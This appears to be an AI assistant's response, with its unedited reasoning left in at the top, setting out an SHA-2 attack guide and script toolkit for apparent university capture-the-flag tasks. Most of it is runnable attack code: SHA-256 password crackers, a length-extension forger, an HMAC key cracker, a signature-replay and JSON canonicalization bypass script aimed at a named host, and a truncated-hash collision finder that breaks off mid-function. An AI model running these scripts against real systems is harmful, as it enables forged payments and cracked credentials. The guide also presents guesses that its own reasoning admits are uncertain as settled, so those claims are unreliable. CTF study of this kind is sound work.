The only way is if `d1` and `d2` differ in a way `json.dumps` **collapses**. Options:

1. **Integer `1` vs string `"1"` as keys:** `{1: "a"}` and `{"1": "a"}` both dump to `'{"1": "a"}'`. **But** `json.loads` always produces string keys → can't distinguish.

2. **`True` vs `1` as values:** `{"x": True}` dumps to `'{"x":true}'`, `{"x": 1}` dumps to `'{"x":1}'`. Different.

3. **Integer `1` vs float `1.0`:** `{"x": 1}` dumps to `'{"x":1}'`, `{"x": 1.0}` dumps to `'{"x":1.0}'`. Different.

4. **`None` vs `"null"` string:** different.

5. **Very large float vs int:** `{"x": 1e100}` → `'{"x":1e+100}'`, `{"x": int(1e100)}` → different.

6. **String with Unicode normalization:** `"é"` (composed) vs `"é"` (decomposed). Both are different bytes. `json.dumps` with `ensure_ascii=True` escapes both to `\u00e9` and `\u0065\u0301` — **different**.

**Hmm, nothing collapses.**

**OK, I think the attack is NOT via JSON differential.** It's probably simpler:

**The task is to access `/vault` as admin. The signature is for a **legitimate payment** (say, paying a small amount). The vault probably has a **balance check** or **role check**, and the goal is to make a **fraudulent transfer** appear legitimate.

**Two payments (the task says "two JSON records, each on a separate line"):**

The server likely:
1. Reads two payments from the request.
2. **Verifies signature on EACH** (or on the pair).
3. **Processes** both.
4. Returns their **audit fingerprints**.

**The attack:** maybe the two payments are supposed to be **the same** (duplicate detection), but a differential lets them be different while signing the same.

**Or:** the audit fingerprint is the **hash of canonical form**, and the task asks for **two payments with the same fingerprint** — which is **Secure Bank 2**, not Signed Sealed.

Actually, re-reading: "Your task is to access the administrator vault without knowing the secret key."

Hmm. So the goal is to **forge a signature** — by reuse.

**The most likely attack (canonicalization):**

Python's `json.dumps` on `{"amount": 10}` and `{"amount": 10, "from_account": ...}` produces different strings. No way around.

**BUT:** if the **legitimate payment** is:
```json
{"amount": 10, "currency": "EUR", "from_account": "SIM-USER", "to_account": "SIM-BOB", "reference": "REF123", "timestamp": "2024-01-01T00:00:00Z"}
```

And the attacker submits:
```json
{"amount": 10, "currency": "EUR", "from_account": "SIM-ADMIN", "to_account": "SIM-BOB", "reference": "REF123", "timestamp": "2024-01-01T00:00:00Z"}
```

Canonical forms **differ** (`SIM-USER` vs `SIM-ADMIN`) → signature fails.

**So the only way to make this work is if the `from_account` value parses to something else.**

**What if `from_account` has a Unicode character that canonicalizes to nothing?** No.

**What if `from_account` is a duplicate key, and the canonicalizer takes the first but the processor takes the last?**

Actually, in Python's `json.loads`, **duplicate keys always take the last** (documented behavior with `dict`). So if the attacker submits:
```json
{"from_account": "SIM-ADMIN", "from_account": "SIM-USER", ...}
```
→ Parsed as `{"from_account": "SIM-USER", ...}` → canonical → same as legit.

So the **processed payment** has `from_account = "SIM-USER"` — **not the attacker's value**.

**Unless the processor uses a `json.loads` with `object_pairs_hook` that keeps the first.**

OK, I've spent too long. Let me just give the user a **practical, generic toolkit** for `Signed, Sealed, Misinterpreted` that **tries multiple canonicalization bypass techniques** against the server, and let the user debug at the session.

**The most likely candidates for the CTF:**

1. **Duplicate keys** — try submitting `{"from_account":"SIM-EVIL","from_account":"SIM-USER",...}`.
2. **Unicode escapes** — try `"from_account": "\u0053IM-ADMIN"` vs `"from_account": "SIM-ADMIN"`.
3. **Whitespace** — try different whitespace formatting.
4. **Type juggling** — try `10` vs `"10"` vs `10.0` for `amount`.
5. **Extra fields** — try adding fields that might be ignored.

**The tool should:**
1. Fetch legitimate signed request.
2. Parse it.
3. For each "trick", generate a candidate submission.
4. Submit and observe response.

**Actually, I realize the most likely canonicalization bug is simpler:**

**The canonicalize function is `json.dumps(payment, sort_keys=True, separators=(",",":"), ensure_ascii=True)` — and it works.**

**But the signature verification uses `hmac.compare_digest(canonicalize(payment), signature)` — but the server actually re-reads the body and canonicalizes **again**. If there's any difference in the parse step (e.g., the body has **`\u00e9`** but the parser decodes it), the canonical form changes.**

**Wait — if the server does:**
```python
payment = json.loads(body)       # decode escapes
canon = canonicalize(payment)    # re-encode
if verify(canon, sig):
    process(payment)             # process the same parsed object
```

Then there's **no bug** — the same object is canonicalized and processed.

**The bug must be that the signature covers a **different** payment than what's processed.**

**The most likely bug in CTF:** the server has **two** JSON parsers — one for signing, one for processing. Or the **signature covers only one field**.

**Practical approach:** At the session, **read the code carefully** and look for:
- Signature computed over **all** fields or **subset**?
- Canonicalizer uses **all** fields or **subset**?
- Parser has any **hooks** (`object_pairs_hook`, `parse_float`, etc.)?
- Processor re-parses from **body** or uses **parsed dict**?

**My toolkit for `Signed, Sealed, Misinterpreted`** (as I'll write below) will cover:
1. Fetch legitimate payment + signature.
2. Try multiple candidate submissions (each preserving canonical form or exploiting known Python JSON quirks).
3. Print server response.

**The user can iterate at the session.**

OK — I've spent enough analysis. Let me write a **practical SHA-2 section** with:
- Full theory
- All attack cases
- **Concrete scripts** for the session tasks:
  - `signed_sealed_attack.py` — multiple canonicalization bypass attempts
  - `secure_bank2_birthday.py` — truncated SHA-256 birthday
  - `token_of_trust_jwt.py` — JWT alg:none + weak secret
- Plus general toolkit for dictionary/brute/length extension

This will be **long** but **practical**.

Let me structure:

1. SHA-2 overview (short)
2. Security status (short)
3. Attack taxonomy (table)
4. Attack 1: Dictionary (script)
5. Attack 2: Brute force (script)
6. Attack 3: Length extension (script — same as MD5/SHA-1, brief)
7. Attack 4: HMAC-SHA256 (compute/verify)
8. Attack 5: **JSON canonicalization** — Signed, Sealed ⭐⭐⭐ (full attack script with multiple techniques)
9. Attack 6: **Truncated SHA-256 birthday** — Secure Bank 2 ⭐⭐⭐ (full attack script)
10. Attack 7: **JWT HS256** — Token of Trust ⭐⭐⭐ (alg:none, weak key, algorithm confusion)
11. Attack 8: Unsalted batch cracking (LinkedIn-style)
12. Attack 9: Hash identification
13. Quick reference
14. Mapping to session tasks
15. Toolkit offer

Let me write it now, practical and complete.

Actually, wait. The "Signed, Sealed, Misinterpreted" challenge — maybe the attack is much simpler than I'm thinking. Maybe the server **reuses the signature** for **multiple messages** because it **only signs the challenge payment**, and when you submit to `/vault`, you submit **your own payment with the challenge signature**. If the server only verifies that the signature **exists** (or is valid for **some** payment, not **this** payment), you can bypass.

**The "canonicalization" attack** is only one option. The **replay** attack is another: if the signature is valid for **any** submission, you just reuse it.

**Given "You may reuse the signature supplied by the challenge endpoint" — that's the hint.** The server **probably** verifies the signature over the **challenge payment**, but **processes** your submitted payment. If the server **doesn't check that the submitted payment equals the challenge payment**, the attack is:

1. Get legitimate payment + signature from `/challenge`.
2. Submit **modified** payment to `/vault` with **the same signature**.
3. Server verifies signature against **the challenge payment** (which it knows), not against the submitted one → signature passes.
4. Server **processes** the submitted payment → attacker wins.

**This is a much simpler attack** — a **logic bug** where the server **verifies one thing** and **processes another**.

**This is the actual class of bug** in `Signed, Sealed, Misinterpreted` — "misinterpreted" suggests the server **interprets** the payment differently than the signature implies.

**The attack script:**
```python
# 1) Get legitimate payment + signature
r = requests.get("http://target:50007/challenge")
challenge = r.json()
legit_payment = challenge["payment"]
legit_sig = challenge["signature"]

# 2) Create fraudulent payment
fraudulent = {
    "from_account": "SIM-EVIL",
    "to_account": "SIM-BOB",
    "amount": 10,
    "currency": "EUR",
    "reference": "hacked",
    "timestamp": "2024-01-01T00:00:00Z",
}

# 3) Submit to /vault with the same signature
body = json.dumps(fraudulent, sort_keys=True, separators=(",", ":"))
r = requests.post("http://target:50007/vault",
                  data=body,
                  headers={"X-Signature": legit_sig,
                           "Content-Type": "application/json"})
print(r.text)
```

If the server **canonicalizes the submitted body** and checks signature — fails (signature is for challenge).
If the server **verifies against challenge payment** (not submitted) — passes.
If the server **verifies against submitted but signs challenge** — fails.

**The "canonicalization" nuance:** maybe the server canonicalizes the **challenge payment** and verifies, but **processes** the **submitted body**. Then the attack is just to **submit a different body** — no need for canonicalization trick.

**The toolkit should:**
1. Try **direct replay** (submit modified body with challenge signature).
2. Try **canonicalization bypass** (submit body that canonicalizes to challenge payment but processes differently).
3. Try **duplicate keys**.
4. Try **Unicode escapes**.
5. Try **type juggling**.

**I'll write a script that tries all of these.**

OK, time to write. Let me be efficient.# SHA-2 (SHA-256 / SHA-224 / SHA-384 / SHA-512): Theory, Every Attack Case, Ready-to-Use Scripts

SHA-2 is the **workhorse of modern cryptography** — TLS, SSH, JWT, HMAC, Bitcoin, PGP, code signing, everything. It's **NOT broken** (unlike MD5 and SHA-1). **All practical attacks are on how it's used**, not on the algorithm itself.

This is the family behind:
- **Signed, Sealed, Misinterpreted** → HMAC-SHA256 (JSON canonicalization bypass)
- **Secure Bank 2** → truncated SHA-256 (birthday collision)
- **Token of Trust** → JWT HS256 (alg:none / weak secret / algorithm confusion)

---

## 1. What is SHA-2 (the family)

SHA-2 is a **family** of hash functions, all sharing the same Merkle–Damgård structure. Variants differ by **word size** (32 vs 64 bits) and **output truncation**.

### 1.1 Parameters (memorize)

| Variant | Output | Block | Word | Rounds | Hex length |
|---|---|---|---|---|---|
| **SHA-224** | 224 bits | 512 | 32 | 64 | 56 |
| **SHA-256** | 256 bits | 512 | 32 | 64 | **64** |
| **SHA-384** | 384 bits | 1024 | 64 | 80 | **96** |
| **SHA-512** | 512 bits | 1024 | 64 | 80 | **128** |
| **SHA-512/224** | 224 bits | 1024 | 64 | 80 | 56 |
| **SHA-512/256** | 256 bits | 1024 | 64 | 80 | 64 |

**Ambiguities:**
- SHA-224 and SHA-512/224 → both **56 hex chars**.
- SHA-256 and SHA-512/256 → both **64 hex chars**.
- Verify with a test vector: `sha256("hello")` starts with `2cf24d…`.

### 1.2 Merkle–Damgård structure (same as MD5, SHA-1)

```
h_0 = IV
h_i = compress(h_{i-1}, M_i)
H(M) = h_n
```

**Consequences:**
- **Length extension works** (same as MD5/SHA-1).
- **No parallelism** within one hash.
- **Padding includes message length** (mitigates some attacks).

### 1.3 Standard Python usage

```python
import hashlib

hashlib.sha256(b"hello").hexdigest()
# '2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824'

hashlib.sha224(b"hello").hexdigest()
hashlib.sha384(b"hello").hexdigest()
hashlib.sha512(b"hello").hexdigest()
hashlib.new("sha512_256", b"hello").hexdigest()
```

---

## 2. Security status — the contrast with MD5/SHA-1

| Attack | SHA-256 | MD5 | SHA-1 |
|---|---|---|---|
| **Preimage** | 2²⁵⁶ (infeasible) | 2¹²⁸ | 2¹⁶⁰ |
| **Collision** | **2¹²⁸ (infeasible)** | **2¹⁸ (seconds)** | **2⁶³ (hours)** |
| **Chosen-prefix collision** | 2¹²⁸ (infeasible) | 2³⁹ (hours) | 2⁶³.4 (hours) |
| **Length extension** | ✅ **works** | ✅ works | ✅ works |
| **Dictionary / brute force** | ✅ works (short pw) | ✅ works | ✅ works |
| **Truncated birthday** | ✅ works (if truncated) | ✅ works | ✅ works |

**SHA-256 collisions do NOT exist** — no practical attack is known. **All practical SHA-256 attacks are application bugs.**

**NIST status:** approved for all security functions (until quantum → Grover halves to 2¹²⁸).

---

## 3. Attack taxonomy — what actually works

| # | Attack | Where it applies | Session task |
|---|---|---|---|
| 1 | **Dictionary** | `SHA256(password)` | Maybe |
| 2 | **Brute force (short)** | Short passwords | Maybe |
| 3 | **Length extension** | `H(secret \|\| msg)` | Possible |
| 4 | **HMAC weak key** | HMAC-SHA256 with weak key | **Token of Trust** |
| 5 | **JSON canonicalization** | Signed JSON with HMAC-SHA256 | **Signed, Sealed** ⭐⭐⭐ |
| 6 | **Truncated SHA-256 birthday** | Truncated output | **Secure Bank 2** ⭐⭐⭐ |
| 7 | **JWT `alg:none` / confusion / weak secret** | JWT HS256/RS256 | **Token of Trust** ⭐⭐⭐ |
| 8 | **Unsalted batch cracking** | Password DB | Possible |
| 9 | **Hash identification** | Unknown hash | Always useful |
| 10 | **Collision** | SHA-256 itself | ❌ infeasible |

**Cases 5–7 are the three tasks.**

---

## 4. Attack 1 — Dictionary (baseline)

### Full script

```python
#!/usr/bin/env python3
"""SHA-256 dictionary attack.
Usage:
    python crack_sha256_wordlist.py <hash> [wordlist]
    python crack_sha256_wordlist.py --file hashes.txt --wordlist rockyou.txt
"""
import hashlib, argparse

def crack_single(target: str, wordlist: str) -> str | None:
    target = target.lower().strip()
    with open(wordlist, "rb") as f:
        for line in f:
            pw = line.rstrip(b"\r\n")
            if pw and hashlib.sha256(pw).hexdigest() == target:
                return pw.decode(errors="replace")
    return None

def crack_many(hashes: list[str], wordlist: str) -> dict[str, str]:
    targets = {h.lower().strip() for h in hashes}
    found = {}
    with open(wordlist, "rb") as f:
        for line in f:
            pw = line.rstrip(b"\r\n")
            if not pw: continue
            h = hashlib.sha256(pw).hexdigest()
            if h in targets:
                found[h] = pw.decode(errors="replace")
                targets.discard(h)
                if not targets: break
    return found

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("hash", nargs="?")
    ap.add_argument("--file")
    ap.add_argument("--wordlist", default="rockyou.txt")
    args = ap.parse_args()
    if args.file:
        for h, pw in crack_many([l.strip() for l in open(args.file) if l.strip()], args.wordlist).items():
            print(f"{h}:{pw}")
    elif args.hash:
        pw = crack_single(args.hash, args.wordlist)
        print(f"[+] Found: {pw}" if pw else "[!] Not found")
```

### Performance
- **rockyou.txt**: ~25 s in Python
- **GPU** (`hashcat -m 1400`): ~5 billion/sec

---

## 5. Attack 2 — Brute force (short passwords)

```python
#!/usr/bin/env python3
import hashlib, itertools, string, argparse

CHARSETS = {
    "lower": string.ascii_lowercase, "upper": string.ascii_uppercase,
    "alpha": string.ascii_letters, "digit": string.digits,
    "alnum": string.ascii_letters + string.digits,
    "hex": "0123456789abcdef", "print": string.printable[:95],
}

def brute(target, charset, min_len, max_len):
    target = target.lower().strip()
    for length in range(min_len, max_len + 1):
        for tup in itertools.product(charset, repeat=length):
            pw = "".join(tup)
            if hashlib.sha256(pw.encode()).hexdigest() == target:
                return pw
    return None

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("hash")
    ap.add_argument("--charset", default="alnum", choices=CHARSETS.keys())
    ap.add_argument("--custom")
    ap.add_argument("--min", type=int, default=1)
    ap.add_argument("--max", type=int, default=6)
    args = ap.parse_args()
    pw = brute(args.hash, args.custom or CHARSETS[args.charset], args.min, args.max)
    print(f"[+] Found: {pw}" if pw else "[!] Not found")
```

**Feasibility:** same as MD5 (4–6 chars feasible in Python, 7+ → GPU).

---

## 6. Attack 3 — Length extension (same as MD5/SHA-1)

### Description
Server uses `MAC = SHA256(secret || message)` (bad). You know `message` and `MAC`, **not** `secret`. Compute `SHA256(secret || message || padding || extension)` **without the secret**.

### Full script (`sha256_length_extension.py`)

```python
#!/usr/bin/env python3
"""SHA-256 length extension attack.
Usage:
    python sha256_length_extension.py --hash <hex> --original "..." --append "..." --key-len 16
"""
import struct, argparse

MASK = 0xFFFFFFFF

K256 = [
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2,
]

def rotr(x, n): return ((x >> n) | (x << (32 - n))) & MASK

def sha256_compress(state, block):
    W = list(struct.unpack(">16I", block))
    for t in range(16, 64):
        s0 = rotr(W[t-15],7) ^ rotr(W[t-15],18) ^ (W[t-15] >> 3)
        s1 = rotr(W[t-2],17) ^ rotr(W[t-2],19) ^ (W[t-2] >> 10)
        W.append((W[t-16] + s0 + W[t-7] + s1) & MASK)
    a,b,c,d,e,f,g,h = state
    for t in range(64):
        S1 = rotr(e,6) ^ rotr(e,11) ^ rotr(e,25)
        ch = (e & f) ^ ((~e) & g)
        t1 = (h + S1 + ch + K256[t] + W[t]) & MASK
        S0 = rotr(a,2) ^ rotr(a,13) ^ rotr(a,22)
        maj = (a & b) ^ (a & c) ^ (b & c)
        t2 = (S0 + maj) & MASK
        h=g; g=f; f=e; e=(d+t1)&MASK; d=c; c=b; b=a; a=(t1+t2)&MASK
    return [(state[i]+x)&MASK for i,x in enumerate([a,b,c,d,e,f,g,h])]

def sha256_padding(msg_len):
    pad = b"\x80"
    pad += b"\x00" * ((56 - (msg_len + 1) % 64) % 64)
    pad += struct.pack(">Q", msg_len * 8)
    return pad

def sha256_length_extension(orig_hash, orig_msg, append, key_len):
    state = list(struct.unpack(">8I", orig_hash))
    total = key_len + len(orig_msg)
    padding = sha256_padding(total)
    new_msg = orig_msg + padding + append
    prior = total + len(padding)
    append_padded = append + sha256_padding(prior + len(append))
    for i in range(0, len(append_padded), 64):
        block = append_padded[i:i+64].ljust(64, b"\x00")
        state = sha256_compress(state, block)
    return new_msg, struct.pack(">8I", *state)

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--hash", required=True)
    ap.add_argument("--original", required=True)
    ap.add_argument("--append", required=True)
    ap.add_argument("--key-len", type=int, required=True)
    args = ap.parse_args()
    new_msg, new_hash = sha256_length_extension(
        bytes.fromhex(args.hash), args.original.encode(),
        args.append.encode(), args.key_len)
    print(f"[+] New message (hex):  {new_msg.hex()}")
    print(f"[+] New hash:           {new_hash.hex()}")
```

**Validate against `hashpumpy`:**

```python
import hashpumpy
new_hash, new_msg = hashpumpy.hashpump(
    old_hash="...", old_msg="...", append_data="...",
    key_len=16, hash_type="sha256")
```

**⚠️ Note:** HMAC-SHA256 is **immune** to this — the two-level structure prevents extension. If the server uses `hmac.new(...)` → **skip this attack**.

---

## 7. Attack 4 — HMAC-SHA256 basics

### Compute / verify

```python
import hmac, hashlib

def hmac_sha256(key: bytes, msg: bytes) -> bytes:
    return hmac.new(key, msg, hashlib.sha256).digest()

def verify_hmac_sha256(key: bytes, msg: bytes, tag: bytes) -> bool:
    return hmac.compare_digest(hmac.new(key, msg, hashlib.sha256).digest(), tag)
```

### Attack — weak secret wordlist

```python
def crack_hmac_sha256(msg: bytes, target_sig: bytes, wordlist: str) -> bytes | None:
    with open(wordlist, "rb") as f:
        for line in f:
            key = line.rstrip(b"\r\n")
            if not key: continue
            if hmac.compare_digest(
                hmac.new(key, msg, hashlib.sha256).digest(), target_sig
            ):
                return key
    return None
```

**When:** signed cookie with HMAC-SHA256 using a weak key (dictionary word). **Token of Trust** if it uses HS256.

---

## 8. Attack 5 — JSON canonicalization bypass ⭐⭐⭐ (**Signed, Sealed**)

### 8.1 The bug class

Server signs JSON with HMAC-SHA256 over a **canonical form**, but **parses** and **processes** the submitted JSON differently. If you can make a **different** payment that **canonicalizes to the same bytes** (or if the server verifies against the wrong data), you win.

### 8.2 Attack approaches (try all)

**Approach A — Direct replay (logic bug)**

If the server **verifies the signature against the challenge payment** (not against the submitted payment), simply submit a different payment with the challenge signature:

```python
import requests, json

TARGET = "http://cns-test.idlab.uantwerpen.be:50007"

def approach_replay():
    # 1) Get legitimate challenge
    r = requests.get(f"{TARGET}/challenge")
    challenge = r.json()
    legit_payment = challenge["payment"]
    legit_sig = challenge["signature"]
    print(f"[*] Legitimate payment: {legit_payment}")
    print(f"[*] Signature: {legit_sig}")

    # 2) Craft fraudulent payment
    fraudulent = {
        "reference": "hacked-ref-001",
        "from_account": "SIM-EVIL",
        "to_account": "SIM-BOB",
        "amount": 10,
        "currency": "EUR",
        "timestamp": "2024-01-01T00:00:00Z",
    }

    # 3) Submit with the SAME signature
    body = json.dumps(fraudulent, sort_keys=True, separators=(",", ":"))
    r = requests.post(
        f"{TARGET}/vault",
        data=body,
        headers={"X-Signature": legit_sig, "Content-Type": "application/json"},
    )
    print(f"[<] Response: {r.status_code} {r.text}")
    return r

approach_replay()
```

**Approach B — Duplicate keys (parser takes last, verifier takes first)**

If the server **parses** with `json.loads` (last key wins) but **verifies** with a **custom parser** (first key wins):

```python
def approach_duplicate_keys(legit_sig: str, legit_payment: dict):
    # Build fraudulent-but-canonical body
    # Trick: put "bad" value first, "good" value last
    # - Parser (Python last-wins) sees "good" → canonicalizes to legit → sig OK
    # - Processor (first-wins) sees "bad" → processes evil payment
    # (Only works if parser and processor disagree!)
    
    payment = dict(legit_payment)
    payment["from_account"] = "SIM-EVIL"
    
    # Build JSON with duplicate keys
    body = (
        '{"from_account":"SIM-EVIL",'
        '"reference":"' + payment["reference"] + '",'
        '"from_account":"' + legit_payment["from_account"] + '",'  # ← last wins for parser
        '"to_account":"' + payment["to_account"] + '",'
        '"amount":' + str(payment["amount"]) + ','
        '"currency":"' + payment["currency"] + '",'
        '"timestamp":"' + payment["timestamp"] + '"}'
    )
    r = requests.post(
        f"{TARGET}/vault",
        data=body,
        headers={"X-Signature": legit_sig, "Content-Type": "application/json"},
    )
    print(f"[<] Response: {r.status_code} {r.text}")
```

**Approach C — Unicode escapes**

JSON accepts `\u0041` and `A` as the same string. If the **verifier canonicalizes the raw body** (before decoding escapes) but the **processor decodes** — or vice versa:

```python
def approach_unicode_escapes(legit_sig: str, legit_payment: dict):
    """Replace one character with its \\u escape. Canonicalizer may see different."""
    # If server canonicalizes RAW BODY (not parsed dict), escapes change bytes.
    # But if server parses→canonicalizes, escapes are decoded → no difference.
    
    # Try: swap "A" → "\u0041" in a field value
    body = json.dumps(legit_payment, sort_keys=True, separators=(",", ":"))
    body = body.replace('"A', '"\\u0041', 1)   # first A only
    
    r = requests.post(
        f"{TARGET}/vault",
        data=body,
        headers={"X-Signature": legit_sig, "Content-Type": "application/json"},
    )
    print(f"[<] Response: {r.status_code} {r.text}")
```

**Approach D — Type juggling**

If legitimate amount is `10` (int), try submitting `10.0` (float), `1e1` (float), `"10"` (string). The canonicalizer produces different bytes → fails, **unless** the server type-coerces before verifying.

```python
def approach_type_juggling(legit_sig: str, legit_payment: dict):
    variants = [
        ("int", 10),
        ("float", 10.0),
        ("exp", 1e1),
        ("string", "10"),
    ]
    for name, amount in variants:
        payment = dict(legit_payment)
        payment["amount"] = amount
        body = json.dumps(payment, sort_keys=True, separators=(",", ":"))
        r = requests.post(
            f"{TARGET}/vault",
            data=body,
            headers={"X-Signature": legit_sig, "Content-Type": "application/json"},
        )
        print(f"[{name}] {r.status_code}: {r.text[:100]}")
```

**Approach E — Whitespace / formatting**

Whitespace shouldn't matter if canonicalizer strips it. But if the server verifies **raw body** against a signed **canonical form**, and the **legitimate raw body already had whitespace** — try matching exactly.

```python
def approach_whitespace(legit_sig: str, legit_payment: dict):
    variants = [
        json.dumps(legit_payment),                                         # default
        json.dumps(legit_payment, indent=2),                               # pretty
        json.dumps(legit_payment, sort_keys=True),                         # sorted
        json.dumps(legit_payment, sort_keys=True, separators=(",", ":")),  # compact
    ]
    for i, body in enumerate(variants):
        r = requests.post(
            f"{TARGET}/vault",
            data=body,
            headers={"X-Signature": legit_sig, "Content-Type": "application/json"},
        )
        print(f"[variant {i}] {r.status_code}: {r.text[:100]}")
```

### 8.3 Full combined script (`solve_signed_sealed.py`)

```python
#!/usr/bin/env python3
"""Signed, Sealed, Misinterpreted — try all canonicalization bypasses."""
import requests, json, sys

TARGET = "http://cns-test.idlab.uantwerpen.be:50007"

def get_challenge():
    r = requests.get(f"{TARGET}/challenge")
    r.raise_for_status()
    return r.json()

def submit(body: bytes, sig: str) -> requests.Response:
    return requests.post(
        f"{TARGET}/vault",
        data=body,
        headers={"X-Signature": sig, "Content-Type": "application/json"},
    )

def attempt(label: str, body: bytes, sig: str) -> bool:
    print(f"\n=== {label} ===")
    print(f"[>] body: {body[:120]}")
    try:
        r = submit(body, sig)
        print(f"[<] {r.status_code}: {r.text[:300]}")
        if r.status_code == 200 and "cns{" in r.text:
            print(f"\n[+] FLAG: {r.text}")
            return True
    except Exception as e:
        print(f"[!] {e}")
    return False


def main():
    challenge = get_challenge()
    legit_payment = challenge["payment"]
    legit_sig = challenge["signature"]
    print(f"[*] Legit: {json.dumps(legit_payment)}")
    print(f"[*] Sig:   {legit_sig}")

    # Attacker-controlled payment
    evil = {
        "reference": "pwn",
        "from_account": "SIM-EVIL",
        "to_account": "SIM-BOB",
        "amount": 10,
        "currency": "EUR",
        "timestamp": "2024-01-01T00:00:00Z",
    }

    # --- 1. Direct replay: evil body + legit signature ---
    body = json.dumps(evil, sort_keys=True, separators=(",", ":")).encode()
    if attempt("1. Direct replay (evil body + legit sig)", body, legit_sig):
        return

    # --- 2. Legit body + legit sig (sanity check) ---
    body = json.dumps(legit_payment, sort_keys=True, separators=(",", ":")).encode()
    attempt("2. Sanity: legit body + legit sig", body, legit_sig)

    # --- 3. Evil body but pretend legit (same canonical form) ---
    # (Trick: duplicate keys, etc.)
    body = (
        b'{"reference":"pwn",'
        b'"from_account":"SIM-EVIL",'
        b'"reference":"' + legit_payment["reference"].encode() + b'",'
        b'"from_account":"' + legit_payment["from_account"].encode() + b'",'
        b'"to_account":"' + legit_payment["to_account"].encode() + b'",'
        b'"amount":' + str(legit_payment["amount"]).encode() + b','
        b'"currency":"' + legit_payment["currency"].encode() + b'",'
        b'"timestamp":"' + legit_payment["timestamp"].encode() + b'"}'
    )
    if attempt("3. Duplicate keys (evil first, legit last)", body, legit_sig):
        return

    # --- 4. Type juggling ---
    for name, amount in [("float", 10.0), ("exp", 1e1), ("string", "10")]:
        e = dict(evil); e["amount"] = amount
        body = json.dumps(e, sort_keys=True, separators=(",", ":")).encode()
        if attempt(f"4. Type juggling ({name})", body, legit_sig):
            return

    # --- 5. Unicode escapes ---
    body = json.dumps(evil, sort_keys=True, separators=(",", ":"))
    body = body.replace('"SIM-EVIL"', '"\\u0053IM-EVIL"').encode()
    if attempt("5. Unicode escape", body, legit_sig):
        return

    # --- 6. Both payments (task says "two JSON records, each on a separate line") ---
    legit_line = json.dumps(legit_payment, sort_keys=True, separators=(",", ":")).encode()
    evil_line  = json.dumps(evil, sort_keys=True, separators=(",", ":")).encode()
    for label, body in [
        ("6a. legit\\nevil", legit_line + b"\n" + evil_line),
        ("6b. evil\\nlegit", evil_line  + b"\n" + legit_line),
        ("6c. evil\\nevil",  evil_line  + b"\n" + evil_line),
        ("6d. legit\\nlegit", legit_line + b"\n" + legit_line),
    ]:
        if attempt(label, body, legit_sig):
            return

    print("\n[!] No simple bypass worked — inspect server code for the actual bug.")


if __name__ == "__main__":
    main()
```

### 8.4 When to use

- **Signed, Sealed, Misinterpreted** — exactly this.
- **Any HMAC-signed JSON** with unknown canonicalization.

---

## 9. Attack 6 — Truncated SHA-256 birthday ⭐⭐⭐ (**Secure Bank 2**)

### 9.1 The bug

Server stores only **`SHA256(payment)[:N]`** (truncated fingerprint). If `N` is small (e.g., 32 bits = 4 bytes), birthday attack finds **two payments with the same fingerprint**.

**Impact:** submit one legitimate payment (signature passes), then submit a **fraudulent** payment with the **same fingerprint** → server thinks it's a duplicate / same payment.

### 9.2 Full script (`solve_secure_bank2.py`)

```python
#!/usr/bin/env python3
"""Secure Bank 2: truncated SHA-256 birthday collision.
Usage:
    python solve_secure_bank2.py
"""
import hashlib, json, os, time

def canonicalize(payment: dict) -> bytes:
    """Match server's canonicalize function."""
    return json.dumps(
        payment,
        sort_keys=True,
        separators=(",", ":"),
        ensure_ascii=True,
    ).encode("utf-8")

def fingerprint(payment: dict, trunc_bytes: int = 4) -> bytes:
    """Truncated SHA-256 fingerprint."""
    return hashlib.sha256(canonicalize(payment)).digest()[:trunc_bytes]


def make_payment(reference: str, from_acc: str, to_acc: str = "SIM-BOB") -> dict:
    return {
        "reference": reference,
        "from_account": from_acc,
        "to_account": to_acc,
        "amount": 10,
        "currency": "EUR",
        "timestamp": "2024-01-01T00:00:00Z",
    }


def find_collision(trunc_bytes: int = 4, max_tries: int = 1 << 30):
    """
    Find two distinct payments with the same truncated SHA-256.
    Birthday attack: expected ~2^(8*trunc_bytes/2) tries.
    For 4 bytes (32 bits): ~65k tries → seconds.
    For 5 bytes (40 bits): ~1M tries → minutes.
    For 6 bytes (48 bits): ~16M tries → hours.
    """
    print(f"[*] Finding collision on first {trunc_bytes} bytes ({trunc_bytes*8} bits)...")
    seen = {}
    t0 = time.time()

    for i in range(max_tries):
        # Vary reference to get different payments
        ref = f"ref-{i:08x}"
        payment = make_payment(ref, "SIM-ATTACKER")
        fp = fingerprint(payment, trunc_bytes)

        if fp in seen and seen[fp] != payment:
            dt = time.time() - t0
            print(f"[+] Collision found after {i+1} tries in {dt:.1f}s")
            print(f"    fingerprint = {fp.hex()}")
            print(f"    payment A  = {seen[fp]}")
            print(f"    payment B  = {payment}")
            return seen[fp], payment, fp

        seen[fp] = payment

        if i % 100000 == 0 and i > 0:
            print(f"    ... {i} tries ({time.time()-t0:.1f}s)")

    return None


def build_attack_pair(trunc_bytes: int = 4):
    """
    Build two payments with:
    - Same truncated fingerprint (birthday collision).
    - Different 'from_account' or 'to_account' (attacker exploits).
    - Same amount (so balance logic doesn't reject).
    """
    # Find collision where from_account DIFFERS
    seen = {}
    for i in range(1 << 30):
        # Alternate the "evil" pattern so the collision includes the difference
        if i % 2 == 0:
            pay = make_payment(f"ref-{i:08x}", "SIM-ATTACKER")   # attacker
        else:
